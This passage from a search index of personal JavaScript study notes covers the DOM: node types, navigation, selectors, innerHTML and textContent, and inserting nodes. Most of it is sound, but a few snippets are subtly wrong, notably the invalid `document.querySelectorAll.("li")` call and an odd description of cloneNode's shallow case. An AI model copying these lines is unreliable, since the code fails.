to the language core. Web browsers give a means to control web pages. Node.js provides server-side features, and so on.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#browser-environment","title":"Browser environment","text":"<p>Here\u2019s a bird\u2019s-eye view of what we have when JavaScript runs in a web browser:</p> <ul> <li>window:<ol> <li>DOM: document, ...</li> <li>BOM: navigator, screen, location, frames, history, XMLHttpRequest</li> <li>JavaScript: Object, Array, Function, ...</li> </ol> </li> </ul> <p>There\u2019s a \u201croot\u201d object called window. It has two roles:</p> <ol> <li>First, it is a global object for JavaScript code.</li> <li>Second, it represents the \u201cbrowser window\u201d and provides methods to control it.</li> </ol>"},{"location":"Dev/Prg/Langs/Js/Dom/#specs","title":"Specs","text":"<ul> <li>DOM specification - Describes the document structure, manipulations, and events.</li> <li>CSSOM specification - Describes stylesheets and style rules, manipulations with them, and their binding to documents.   The CSSOM is used together with the DOM when we modify style rules for the document. In practice though, the CSSOM is rarely required, because we rarely need to modify CSS rules from JavaScript (usually we just add/remove CSS classes, not modify their CSS rules), but that\u2019s also possible.</li> <li>HTML specification - Describes the HTML language (e.g. tags) and also the BOM (browser object model) \u2013 various browser functions: <code>setTimeout</code>, <code>alert</code>, <code>location</code> and so on. It takes the DOM specification and extends it with many additional properties and methods.</li> <li>Additionally, some classes are described separately at https://spec.whatwg.org/.</li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#dom-essentials","title":"DOM Essentials","text":"<ul> <li>W3S Course</li> <li>MDN: DOM Events</li> <li>Document(JAVASCRIPT.INFO)</li> <li>Event Delegation(JAVASCRIPT.INFO)</li> <li>Javascript Char Codes (Key Codes)</li> </ul> <p>Document Object Model, or DOM for short, represents all page content as objects that can be modified.</p> <p>Note</p> <p>DOM is not only for browsers For instance, server-side scripts that download HTML pages and process them can also use the DOM. They may support only a part of the specification though.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#dom-tree","title":"DOM Tree","text":"<p>There are 12 node types. In practice we usually work with 4 of them:</p> <ol> <li><code>document</code> object - the main \u201centry point\u201d to the page(= into DOM), represents the whole document.</li> <li>element nodes \u2013 HTML-tags, the tree building blocks.</li> <li>text nodes \u2013 contain text(spaces and newlines too!).</li> <li>comment nodes \u2013 sometimes we can put information there, it won\u2019t be shown, but JS can read it from the DOM.</li> </ol> <p>node.nodeType - \u201cold-fashioned\u201d way to get the \u201ctype\u201d of a DOM node, read only:</p> <ul> <li><code>node.nodeType == 9</code> for the 'document' object</li> <li><code>node.nodeType == 8</code> for comment nodes</li> <li><code>node.nodeType == 3</code> for text nodes</li> <li><code>node.nodeType == 1</code> for element nodes</li> </ul> <pre><code>&lt;body&gt;&lt;!-- this is a comment --&gt;\n  &lt;script&gt;\nlet elem = document.body;\n\n// let's examine: what type of node is in elem?\nconsole.log(elem.nodeType); // 1 =&gt; element\n\n// its first child is...\nconsole.log(elem.firstChild.nodeType); // 8 =&gt; comment\n\n// and its second child is...\nconsole.log(elem.childNodes[1].nodeType) // 3 =&gt; text(newline)\n\n// for the document object, the type is 9\nconsole.log(document.nodeType); // 9\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>In modern scripts, we can use <code>instanceof</code> and other class-based tests to see the node type.</p> <p>node.nodeName - returns:</p> <ul> <li>for element nodes: <code>&lt;tag&gt;</code> name(same as <code>element.tagName</code> property do)</li> <li>for other node types (text, comment, etc.): string with the node type</li> </ul> <pre><code>&lt;body&gt;&lt;!-- comment --&gt;\n  &lt;script&gt;\n// for &lt;body&gt; element\nconsole.log(document.body.nodeName); // BODY\n\n// for comment\nconsole.log(document.body.firstChild.nodeName); // #comment\n\n// for document\nconsole.log(document.nodeName); // #document\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/Dom/#walking-the-dom","title":"Walking the DOM","text":"<ul> <li> <p>The topmost tree nodes are available directly as <code>document</code> properties:</p> <ul> <li><code>&lt;html&gt;...&lt;/html&gt;</code> = <code>document.documentElement</code></li> <li><code>&lt;head&gt;...&lt;/head&gt;</code> = <code>document.head</code></li> <li><code>&lt;body&gt;...&lt;/body&gt;</code> = <code>document.body</code></li> </ul> </li> <li> <p>Given an any DOM node, we can go to its immediate neighbors using navigation properties.</p> <p>There are two main sets of them:</p> <ul> <li>For all nodes: <code>parentNode</code>, <code>childNodes</code>, <code>firstChild</code>(=== <code>childNodes[0]</code>), <code>lastChild</code>(=== <code>childNodes[elem.childNodes.length - 1]</code>), <code>previousSibling</code>, <code>nextSibling</code>.</li> <li> <p>For element nodes only: <code>parentElement</code>, <code>children</code>, <code>firstElementChild</code>, <code>lastElementChild</code>, <code>previousElementSibling</code>, <code>nextElementSibling</code>.</p> <p>Examples:</p> <pre><code>document.querySelectorAll.(\"li\")[1].parentElement; //e.g. get 'ul' element\ndocument.querySelectorAll.(\"li\")[1].parentElement.parentElement; //e.g. gets 'body' element\n\ndocument.querySelectorAll.(\"li\")[1].parentElement.children; //e.g. get all the children elements of the 'body'\n</code></pre> </li> </ul> <p>DOM Collections</p> <p><code>childNodes</code> and <code>children</code> are collections. Collection \u2013 a special array-like iterable object and has two important consequences:</p> <ul> <li> <p>we can use <code>for..of</code> to iterate over it:</p> <pre><code>for (let node of document.body.childNodes) {\nalert(node); // shows all nodes from the collection\n}\n</code></pre> <p>That\u2019s because it\u2019s iterable (provides the <code>Symbol.iterator</code> property, as required).</p> <p>Don\u2019t use <code>for..in</code> to loop over collections</p> <p>The <code>for..in</code> loop iterates over all enumerable properties. And collections have some \u201cextra\u201d rarely used properties that we usually do not want to get:</p> <pre><code>&lt;body&gt;\n&lt;script&gt;\n// shows 0, 1, length, item, values and more.\nfor (let prop in document.body.childNodes) alert(prop);\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> </li> <li> <p>array methods won\u2019t work, because it\u2019s not an array:</p> <pre><code>alert(document.body.childNodes.filter); // undefined (there's no filter method!)\n</code></pre> <p>BUT: We can create a \u201creal\u201d array from the collection, if we want array methods, i.e. to make a copy using <code>Array.from</code> to iterate over if adding, moving, or removing nodes.</p> <pre><code>alert( Array.from(document.body.childNodes).filter ); // function\n</code></pre> </li> </ul> <p>DOM collections are live</p> <p>Almost all DOM collections with minor exceptions are live, i.e. they reflect the current state of DOM. If we keep a reference to <code>element.childNodes</code>, and add/remove nodes into DOM, then they appear in the collection automatically.</p> <p>DOM collections and navigation properties are read-only</p> <p>We can\u2019t replace a child by something else by assigning <code>childNodes[i] = ...</code>. Changing DOM needs other methods, see below.</p> </li> <li> <p>Some types of DOM elements, provide additional navigation properties and collections to access their content, e.g.:</p> <ol> <li> <p><code>&lt;table&gt;...&lt;/table&gt;</code></p> <ul> <li><code>table.rows</code> \u2013 the collection of <code>&lt;tr&gt;</code> elements of the table.</li> <li><code>table.caption/tHead/tFoot</code> \u2013 references to elements <code>&lt;caption&gt;</code>, <code>&lt;thead&gt;</code>, <code>&lt;tfoot&gt;</code>.</li> <li><code>table.tBodies</code> \u2013 the collection of <code>&lt;tbody&gt;</code> elements (can be many according to the standard, but there will always be at least one \u2013 even if it is not in the source HTML, the browser will put it in the DOM).</li> </ul> <p><code>&lt;thead&gt;</code>, <code>&lt;tfoot&gt;</code>, <code>&lt;tbody&gt;</code> elements provide the rows property:</p> <ul> <li><code>tbody.rows</code> \u2013 the collection of <code>&lt;tr&gt;</code> inside.</li> </ul> <p><code>&lt;tr&gt;</code> :</p> <ul> <li><code>tr.cells</code> \u2013 the collection of <code>&lt;td&gt;</code> and <code>&lt;th&gt;</code> cells inside the given <code>&lt;tr&gt;</code>.</li> <li><code>tr.sectionRowIndex</code> \u2013 the position (index) of the given <code>&lt;tr&gt;</code> inside the enclosing <code>&lt;thead&gt;/&lt;tbody&gt;/&lt;tfoot&gt;</code>.</li> <li><code>tr.rowIndex</code> \u2013 the number of the <code>&lt;tr&gt;</code> in the table as a whole (including all table rows).</li> </ul> <p><code>&lt;td&gt;</code> and <code>&lt;th&gt;</code> :</p> <ul> <li><code>td.cellIndex</code> \u2013 the number of the cell inside the enclosing <code>&lt;tr&gt;</code>.</li> </ul> <p>An example of usage:</p> <pre><code>&lt;table id=\"table\"&gt;\n  &lt;tr&gt;\n    &lt;td&gt;one&lt;/td&gt;&lt;td&gt;two&lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;three&lt;/td&gt;&lt;td&gt;four&lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/table&gt;\n\n&lt;script&gt;\n// get td with \"two\" (first row, second column)\nlet td = table.rows[0].cells[1];\ntd.style.backgroundColor = \"red\"; // highlight it\n&lt;/script&gt;\n</code></pre> </li> <li> <p><code>&lt;form&gt;...&lt;/form&gt;</code></p> </li> </ol> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#searching-the-dom","title":"Searching the DOM","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#using-getelements","title":"Using <code>getElement(s)*</code>","text":"<p>This methods used for older code bases.</p> <ul> <li> <p>document.getElementById</p> <pre><code>document.getElementById(\"first\");\n</code></pre> </li> </ul> <p>All methods <code>getElementsBy*</code> below return a live collection.</p> <p>Such collections always reflect the current state of the document and \u201cauto-update\u201d when it changes.</p> <ul> <li> <p>element.getElementsByTagName</p> <p>looks for elements with the given tag and returns the live collection of them the tag parameter can also be a star <code>\"*\"</code> for \u201cany tags\u201d</p> <pre><code>// outputs live collection of all h1 elements:\ndocument.getElementsByTagName(\"h1\");\n// outputs specific element:\ndocument.getElementsByTagName(\"h1\")[0];\n</code></pre> <pre><code>&lt;!-- Let\u2019s find all input tags inside the table: --&gt;\n&lt;table id=\"table\"&gt;\n  &lt;tr&gt;\n    &lt;td&gt;Your age:&lt;/td&gt;\n\n    &lt;td&gt;\n      &lt;label&gt;\n        &lt;input type=\"radio\" name=\"age\" value=\"young\" checked&gt; less than 18\n      &lt;/label&gt;\n      &lt;label&gt;\n        &lt;input type=\"radio\" name=\"age\" value=\"mature\"&gt; from 18 to 50\n      &lt;/label&gt;\n      &lt;label&gt;\n        &lt;input type=\"radio\" name=\"age\" value=\"senior\"&gt; more than 60\n      &lt;/label&gt;\n    &lt;/td&gt;\n  &lt;/tr&gt;\n\n&lt;/table&gt;\n\n&lt;script&gt;\nlet inputs = table.getElementsByTagName('input');\n\nfor (let input of inputs) {\nalert( input.value + ': ' + input.checked );\n}\n&lt;/script&gt;\n</code></pre> </li> <li> <p>element.getElementsByClassName</p> <p>looks for elements with the given class and returns the live collection of them</p> <pre><code>// outputs live collection of all elements with class 'second':\ndocument.getElementsByClassName(\"second\");\n// outputs specific element:\ndocument.getElementsByClassName(\"second\")[0];\n</code></pre> </li> <li> <p>document.getElementsByName</p> <p>looks for elements with the given name and returns the live collection of them</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#using-queryselector","title":"Using <code>querySelector*</code>","text":"<p>This methods can select anything inside quotes exactly like selecting in CSS. They are more powerfull than the first three above.</p> <ul> <li> <p>element.querySelectorAll</p> <p>returns all elements in the document that matches a specified CSS selector(s), as a static NodeList object(static collection), i.e. it doesn't reflect the current state of the document and doesn't \u201cauto-update\u201d when it changes can be iterated with <code>for...of</code> loop or with <code>forEach</code> array method</p> <p>Can use pseudo-classes as well</p> <p>Pseudo-classes in the CSS selector like <code>:hover</code> and <code>:active</code> are also supported. For instance, <code>document.querySelectorAll(':hover')</code> will return the collection with elements that the pointer is over now (in nesting order: from the outermost <code>&lt;html&gt;</code> to the most nested one).</p> <pre><code>&lt;!-- Here we look for all &lt;li&gt; elements that are last children: --&gt;\n&lt;ul&gt;\n  &lt;li&gt;The&lt;/li&gt;\n  &lt;li&gt;test&lt;/li&gt;\n\n&lt;/ul&gt;\n&lt;ul&gt;\n  &lt;li&gt;has&lt;/li&gt;\n  &lt;li&gt;passed&lt;/li&gt;\n&lt;/ul&gt;\n&lt;script&gt;\nlet elements = document.querySelectorAll('ul &gt; li:last-child');\n\nfor (let elem of elements) {\nalert(elem.innerHTML); // \"test\", \"passed\"\n}\n&lt;/script&gt;\n</code></pre> <p>element.querySelectorAll \u201cunexpected\u201c result</p> <p>By default this method checks the last element without considering the context, e.g.:</p> <pre><code>&lt;ul class=\"list\"&gt;\n  &lt;li class=\"item-list\"&gt;\n    &lt;ul class=\"sub-list\"&gt;\n      &lt;li class=\"item-sub-list\"&gt;&lt;/li&gt;\n      &lt;li class=\"item-sub-list\"&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n  &lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;script&gt;\nconst sublist = document.querySelectorAll('.sub-list')\nconst sublistitems = sublist[0].querySelectorAll('.list .item-sub-list')\nconsole.log(sublistitems)  // NodeList(2)\u00a0[li.item-sub-list, li.item-sub-list]\n&lt;/script&gt;\n&lt;!-- we expect here to get nothing, but instead we've got collection of 2 nodes --&gt;\n</code></pre> </li> <li> <p>element.querySelector</p> <p>returns the first element that matches a specified CSS selector(s) in the document, i.e. the result(only!) is the same as <code>element.querySelectorAll(css)[0]</code>, but the latter is looking for all elements and picking one, while <code>element.querySelector</code> just looks for one, so it\u2019s faster and also shorter to write</p> <pre><code>document.querySelector(\"li\");\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#dom-selectors-summary-table","title":"DOM selectors summary table","text":"Method Searches by... Retruns Can call on an element? Live collection? <code>querySelector</code> CSS-selector One obect <code>querySelectorAll</code> CSS-selector Collection of objects <code>getElementById</code> <code>id</code> One obect  - Searches the whole document by calling on <code>document</code> object <code>getElementsByName</code> <code>name</code> Collection of objects  - Searches the whole document by calling on <code>document</code> object <code>getElementsByTagName</code> tag or <code>'*'</code> Collection of objects <code>getElementsByClassName</code> class Collection of objects <p>It is important to CACHE selectors in variables.</p> <p>This is in order to reduce memory usage by js engine(by going to DOM each time when we use selector), e.g: <code>var h1 = document.querySelector(\"h1\");</code></p>"},{"location":"Dev/Prg/Langs/Js/Dom/#additional-useful-methods","title":"Additional useful methods","text":"<ul> <li> <p>element.matches(css)</p> <p>checks if element matches the given CSS-selector and returns <code>true</code> or <code>false</code></p> <pre><code>&lt;a href=\"http://example.com/file.zip\"&gt;...&lt;/a&gt;\n&lt;a href=\"http://ya.ru\"&gt;...&lt;/a&gt;\n\n&lt;script&gt;\n// can be any collection instead of document.body.children\nfor (let elem of document.body.children) {\nif (elem.matches('a[href$=\"zip\"]')) {\nalert(\"The archive reference: \" + elem.href );\n}\n}\n&lt;/script&gt;\n</code></pre> </li> <li> <p>element.closest(css)</p> <p>looks for the nearest ancestor that matches the CSS-selector; returns <code>null</code> if finds nothing; the element itself is also included in the search</p> <pre><code>&lt;h1&gt;Contents&lt;/h1&gt;\n\n&lt;div class=\"contents\"&gt;\n  &lt;ul class=\"book\"&gt;\n    &lt;li class=\"chapter\"&gt;Chapter 1&lt;/li&gt;\n    &lt;li class=\"chapter\"&gt;Chapter 2&lt;/li&gt;\n  &lt;/ul&gt;\n&lt;/div&gt;\n\n&lt;script&gt;\nlet chapter = document.querySelector('.chapter'); // LI\n\nalert(chapter.closest('.book')); // UL\nalert(chapter.closest('.contents')); // DIV\n\nalert(chapter.closest('h1')); // null (because h1 is not an ancestor)\n&lt;/script&gt;\n</code></pre> </li> <li> <p>elemA.contains(elemB)</p> <p>checks for the child-parent relationship; returns true if <code>elemB</code> is inside <code>elemA</code> (a descendant of <code>elemA</code>) or when <code>elemA==elemB</code></p> </li> <li> <p>element.tagName</p> <p>returns <code>&lt;tag&gt;</code> name</p> <p><code>tagName</code> is only supported by element nodes (as it originates from <code>Element</code> class)</p> <pre><code>&lt;body&gt;&lt;!-- comment --&gt;\n  &lt;script&gt;\n// for &lt;body&gt; element\nconsole.log(document.body.tagName); // BODY\n\n// for comment\nconsole.log(document.body.firstChild.tagName); // undefined (not an element node)\n\n// for document\nconsole.log(document.tagName); // undefined (not an element node)\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>The tag name is always uppercase except in XML mode.</p> <p>The browser has two modes of processing documents: HTML and XML. Usually the HTML-mode is used for webpages. XML-mode is enabled when the browser receives an XML-document with the header: <code>Content-Type: application/xml+xhtml</code>.</p> <p>In HTML mode <code>tagName</code>(and <code>nodeName</code>) is always uppercased: it\u2019s <code>BODY</code> either for <code>&lt;body&gt;</code> or <code>&lt;BoDy&gt;</code>.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#changing-the-dom","title":"Changing the DOM","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#changing-nodes-content","title":"Changing nodes content","text":"<ul> <li> <p>element.innerHTML</p> <pre><code>// returns the HTML content(inner HTML) of an element as a string\ndocument.querySelector(\"h1\").innerHTML;\n</code></pre> <pre><code>// sets the HTML content(inner HTML) of an element\n// DANGEROUS - it removes everything within the element(also other elements)\ndocument.querySelector(\"h1\").innerHTML = \"&lt;strong&gt;!!!!!!&lt;/strong&gt;\";\n</code></pre> <p><code>element.innerHTML = \"...\";</code> typing errors automatically fixed by browser</p> <p>For example when we forgot to close the tag.</p> <p><code>element.innerHTML = \"...\";</code> don\u2019t execute scripts</p> <p>When inserting a <code>&lt;script&gt;</code> tag into the document \u2013 it becomes a part of HTML, but doesn\u2019t execute.</p> <pre><code>//appends HTML to an element\nelem.innerHTML += \"...\";\n// is a shorter way to write:\nelem.innerHTML = elem.innerHTML + \"...\"\n// In other words, 'innerHTML+=' does this:\n// 1. The old contents is removed.\n// 2. The new 'innerHTML' is written instead (a concatenation of the old and the new one).\n// DANGEROUS - becsause the old content is \u201czeroed-out\u201d causing following side effects:\n// - all images and other resources will be reloaded\n// - if the existing text was selected with the mouse, then most browsers will remove the selection upon rewriting 'innerHTML'\n// - if there was an &lt;input&gt; with a text entered by the visitor, then the text will be removed\n// - and so on ...\n</code></pre> </li> <li> <p>element.outerHTML</p> <pre><code>&lt;!-- returns the full HTML of the element as a string, like 'innerHTML' plus the element itself --&gt;\n&lt;div id=\"elem\"&gt;Hello &lt;b&gt;World&lt;/b&gt;&lt;/div&gt;\n&lt;script&gt;\nalert(elem.outerHTML); // &lt;div id=\"elem\"&gt;Hello &lt;b&gt;World&lt;/b&gt;&lt;/div&gt;\n&lt;/script&gt;\n</code></pre> <pre><code>&lt;!-- seting the full HTML of the element --&gt;\n&lt;div&gt;Hello, world!&lt;/div&gt;\n&lt;script&gt;\nlet elem = document.querySelector('div');\n\n// replace elem.outerHTML with &lt;p&gt;...&lt;/p&gt;\nelem.outerHTML = '&lt;p&gt;A new element&lt;/p&gt;'; // (*)\n\n// Wow! 'elem' is still the same!\nalert(elem.outerHTML); // &lt;div&gt;Hello, world!&lt;/div&gt; (**)\n&lt;/script&gt;\n</code></pre> <p>Regarding the codeblock above:Unlike <code>innerHTML</code>, writing to <code>outerHTML</code> does not change the element. Instead, it replaces it in the DOM.</p> <p>In the line <code>(*)</code> we replaced <code>elem</code> with <code>&lt;p&gt;A new element&lt;/p&gt;</code>. In the outer document (the DOM and therefore the page content) we can see the new content instead of the <code>&lt;div&gt;Hello, world!&lt;/div&gt;</code>. But, as we can see in line <code>(**)</code>, the value of the old <code>elem</code> variable hasn\u2019t changed!</p> <p>The <code>outerHTML</code> assignment does not modify the DOM element (the object referenced by, in this case, the variable <code>elem</code>), but removes it from the DOM and inserts the new HTML in its place.</p> <p>So what happened in <code>elem.outerHTML=...</code> is:</p> <ul> <li><code>elem</code> was removed from the document</li> <li>another piece of HTML <code>&lt;p&gt;A new element&lt;/p&gt;</code> was inserted in its place</li> <li><code>elem</code> still has its old value and the new HTML(<code>&lt;p&gt;A new element&lt;/p&gt;</code>) wasn\u2019t saved to any variable</li> </ul> <p>Tip</p> <p>It\u2019s so easy to make an error here: modify <code>elem.outerHTML</code> and then continue to work with <code>elem</code> as if it had the new content in it. But it doesn\u2019t. <code>elem.outerHTML = '...'</code> puts the new HTML in its place instead. We can get references to the new elements by querying the DOM.</p> </li> <li> <p>textNode/commentNode.data, textNode/commentNode.nodeValue</p> <p><code>data</code> and <code>nodeValue</code> properties are almost the same for practical use.</p> <p>There are only minor specification differences. So we\u2019ll use <code>data</code>, because it\u2019s shorter.</p> <p>returns/modifies the content of a non-element node(text, comment):</p> <pre><code>&lt;body&gt;\n  Hello\n  &lt;!-- Comment --&gt;\n  &lt;script&gt;\nlet text = document.body.firstChild;\nconsole.log(text.data); // Hello\n\ntext.data = 'Hello World!'\nconsole.log(text.data); // Hello World!\n\nlet comment = text.nextSibling;\nconsole.log(comment.data); // Comment\n\ncomment.data = 'New Comment';\nconsole.log(comment.data); // New Comment\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>Practical usgae of commentNode.data</p> <p>Sometimes developers embed information or template instructions into HTML in them, like this:</p> <pre><code>&lt;!-- if isAdmin --&gt;\n  &lt;div&gt;Welcome, Admin!&lt;/div&gt;\n&lt;!-- /if --&gt;\n</code></pre> <p>\u2026Then JavaScript can read it from <code>data</code> property and process embedded instructions.</p> </li> <li> <p>element.textContent</p> <p>provides access to the text inside the element: only text, minus all <code>&lt;tags&gt;</code></p> <pre><code>&lt;!-- returning text content --&gt;\n&lt;div id=\"news\"&gt;\n  &lt;h1&gt;Headline!&lt;/h1&gt;\n  &lt;p&gt;Martians attack people!&lt;/p&gt;\n&lt;/div&gt;\n\n&lt;script&gt;\nlet news = document.querySelector('#news');\n// Headline! Martians attack people!\nalert(news.textContent);\n&lt;/script&gt;\n</code></pre> <pre><code>&lt;!-- modifying/writing to text content --&gt;\n\n&lt;!-- this div gets the name \u201cas HTML\u201d: all tags become tags, so we see the bold name --&gt;\n&lt;div id=\"elem1\"&gt;&lt;/div&gt;\n&lt;!-- this div gets the name \u201cas text\u201d, so we literally see &lt;b&gt;Winnie-the-Pooh!&lt;/b&gt; --&gt;\n&lt;div id=\"elem2\"&gt;&lt;/div&gt;\n&lt;script&gt;\nlet name = prompt(\"What's your name?\", \"&lt;b&gt;Winnie-the-Pooh!&lt;/b&gt;\");\n\nlet elem1 = document.querySelector('#elem1')\nlet elem2 = document.querySelector('#elem2')\nelem1.innerHTML = name;\nelem2.textContent = name;\n&lt;/script&gt;\n</code></pre> <p>Getting an input from a user.</p> <p>In most cases, we expect the text from a user, and want to treat it as text. We don\u2019t want unexpected HTML in our site. An assignment to <code>textContent</code> does exactly that.</p> </li> <li> <p>element.hidden, <code>&lt;tag hidden&gt;...&lt;/tag&gt;</code></p> <p>The \u201chidden\u201d attribute and the DOM property specifies whether the element is visible or not. Technically, hidden works the same as <code>style=\"display:none\"</code>. But it\u2019s shorter to write.</p> <p>Example of blinking element:</p> <pre><code>&lt;div id=\"elem\"&gt;A blinking element&lt;/div&gt;\n\n&lt;script&gt;\nlet elem = document.querySelector('#elem');\nsetInterval(() =&gt; elem.hidden = !elem.hidden, 1000);\n&lt;/script&gt;\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#creation-insertion-removal-of-nodes","title":"Creation, insertion, removal of nodes","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#creation","title":"Creation","text":"<ul> <li>document.createElement('tag') \u2013 creates an element with the given tag</li> <li>document.createTextNode('string value') \u2013 creates a text node(rarely used)</li> <li>element.cloneNode(deep) \u2013 clones the element without descendants when <code>deep==''</code>, if <code>deep==true</code> then with all descendants</li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#insertion-and-removal","title":"Insertion and removal","text":"<ul> <li>node.append(...nodes or 'strings') - insert into node, at the end</li> <li>node.prepend(...nodes or 'strings') - insert into node, at the beginning</li> <li>node.before(...nodes or 'strings') - insert right before node</li> <li>node.after(...nodes or 'strings') - insert right after node</li> <li>node.replaceWith(...nodes or 'strings') - replace node</li> <li>node.remove() - remove the node</li> </ul> <p>The above insertion methods can only be used to insert DOM nodes or text pieces.</p> <p>To insert an HTML string \u201cas html\u201d, with all tags and stuff working, in the same manner as <code>element.innerHTML</code> does it use following method:</p> <ul> <li> <p>Given some HTML in <code>html</code>, element.insertAdjacentHTML(\"where\", html) inserts it depending on the value of <code>\"where\"</code>:</p> <ul> <li>\"beforebegin\" \u2013 insert html right before elem</li> <li>\"afterbegin\" \u2013 insert html into elem, at the beginning</li> <li>\"beforeend\" \u2013 insert html into elem, at the end</li> <li>\"afterend\" \u2013 insert html right after elem</li> </ul> <p>Also there are similar methods, element.insertAdjacentText(\"where\", 'text') and element.insertAdjacentElement(\"where\", element), that insert text strings and elements, but they are rarely used because there are mentioned above <code>append</code>, <code>prepend</code>, <code>before</code> and <code>after</code> methods for this needs.</p> </li> </ul> <pre><code>&lt;style&gt;\n.alert {\npadding: 15px;\nborder: 1px solid #d6e9c6;\nborder-radius: 4px;\ncolor: #3c763d;\nbackground-color: #dff0d8;\n}\n&lt;/style&gt;\n\n&lt;script&gt;\n// 1. Create &lt;div&gt; element\nlet div = document.createElement('div');\n// 2. Set its class to \"alert\"\ndiv.className = \"alert\";\n// 3. Fill it with the content\ndiv.innerHTML = \"&lt;strong&gt;Hi there!&lt;/strong&gt; You've read an important message.\";\n\ndocument.body.append(div);\n&lt;/script&gt;\n\n&lt;!-- alternative variant using insertAdjacentHTML --&gt;\n&lt;script&gt;\ndocument.body.insertAdjacentHTML(\"afterbegin\", `&lt;div class=\"alert\"&gt;\n    &lt;strong&gt;Hi there!&lt;/strong&gt; You've read an important message.\n  &lt;/div&gt;`);\n&lt;/script&gt;\n</code></pre> <pre><code>&lt;!-- inserting multiple nodes and text pieces in a single call --&gt;\n&lt;div id=\"div\"&gt;&lt;/div&gt;\n&lt;script&gt;\ndiv.before('&lt;p&gt;Hello&lt;/p&gt;', document.createElement('hr'));\n&lt;/script&gt;\n</code></pre> <p>All insertion methods automatically remove the node from the old place.</p> <p>For instance, let\u2019s swap elements:</p> <pre><code>&lt;div id=\"first\"&gt;First&lt;/div&gt;\n&lt;div id=\"second\"&gt;Second&lt;/div&gt;\n&lt;script&gt;\n// no need to call remove\nsecond.after(first); // take #second and after it insert #first\n&lt;/script&gt;\n</code></pre> <ul> <li> <p>DocumentFragment - a special DOM node that serves as a wrapper to pass around lists of nodes. It is rarely used explicitly.</p> <p><code>DocumentFragment</code> mentioned here mainly because there are some concepts on top of it, like <code>&lt;template&gt;&lt;/template&gt;</code> element.</p> </li> <li> <p>document.write(html) - append HTML to the page before it has finished loading</p> <pre><code>&lt;p&gt;Somewhere in the page...&lt;/p&gt;\n&lt;script&gt;\ndocument.write('&lt;b&gt;Hello from JS&lt;/b&gt;');\n&lt;/script&gt;\n&lt;p&gt;The end&lt;/p&gt;\n</code></pre> <p>The call to <code>document.write</code> only works while the page is loading. So it\u2019s kind of unusable at \u201cafter loaded\u201d stage, unlike other DOM methods.</p> <p>Technically, when <code>document.write</code> is called while the browser is reading (\u201cparsing\u201d) incoming HTML, and it writes something, the browser consumes it just as if it were initially there, in the HTML text. So it works blazingly fast, because there\u2019s no DOM modification involved. It writes directly into the page text, while the DOM is not yet built. So if we need to add a lot of text into HTML dynamically, and we\u2019re at page loading phase, and the speed matters, it may help. But in practice these requirements rarely come together. And usually we can see this method in scripts just because they are old.</p> <p>After the page is loaded such a call erases the document.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#insertion-and-removalold-school-methods","title":"Insertion and removal(\u201cold school\u201d methods)","text":"<ul> <li>parent.appendChild(node) - appends <code>node</code> as the last child of <code>parentElem</code></li> <li> <p>parent.insertBefore(node, nextSibling) - inserts <code>node</code> before <code>nextSibling</code> into <code>parentElem</code></p> <pre><code>&lt;ol id=\"list\"&gt;\n  &lt;li&gt;0&lt;/li&gt;\n  &lt;li&gt;1&lt;/li&gt;\n  &lt;li&gt;2&lt;/li&gt;\n&lt;/ol&gt;\n\n&lt;!-- insert a new list item before the second &lt;li&gt; --&gt;\n&lt;script&gt;\nlet newLi = document.createElement('li');\nnewLi.innerHTML = 'Hello, world!';\n\nlist.insertBefore(newLi, list.children[1]);\n&lt;/script&gt;\n\n&lt;!--  insert 'newLi' as the first element --&gt;\n&lt;script&gt;\nlist.insertBefore(newLi, list.firstChild);\n&lt;/script&gt;\n</code></pre> </li> <li> <p>parent.removeChild(node) - removes <code>node</code> from <code>parentElem</code> (assuming <code>node</code> is its child)</p> </li> <li>parent.replaceChild(newElement, node) - replaces <code>oldChild</code> with <code>node</code> among children of <code>parentElem</code></li> </ul> <p>All these methods return the inserted/removed <code>node</code>.</p> <p>But usually the returned value is not used, we just run the method.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#changing-element-properties-class-style","title":"Changing element properties: class, style","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#class","title":"class","text":"<ul> <li> <p>element.className \u2013 corresponds to the <code>class</code> attribute; the string value, good to manage the whole set of classes</p> <pre><code>// returns the class name(s) of an element as string\ndocument.querySelector(\"h1\").className;\n</code></pre> <pre><code>// sets the class name of an element (i.e. removes existing class names if any and then adds the new one)\ndocument.querySelector(\"h1\").className = \"coolTitle\";\n</code></pre> </li> <li> <p>element.classList\u2013 the object with methods <code>add/remove/toggle/contains</code>, good for individual classes</p> <pre><code>// return a list of classes of the element as iterable,\ndocument.querySelector(\"h1\").classList;\n\n// so we can list all classes with 'for..of' loop\nfor (let name of document.querySelector(\"h1\").classList) {\nconsole.log(name);\n}\n</code></pre> <pre><code>// sets the class name of an element (i.e. removes existing class names if any and then adds the new one)\ndocument.querySelector(\"h1\").classList = \"coolTitle\";\n</code></pre> <p>Methods of classList:</p> <ul> <li>element.classList.add/remove(\"class\") \u2013 adds/removes the class</li> <li>element.classList.toggle(\"class\") \u2013 adds the class if it doesn\u2019t exist, otherwise removes it</li> <li>element.classList.contains(\"class\") \u2013 checks for the given class, returns <code>true/false</code></li> </ul> 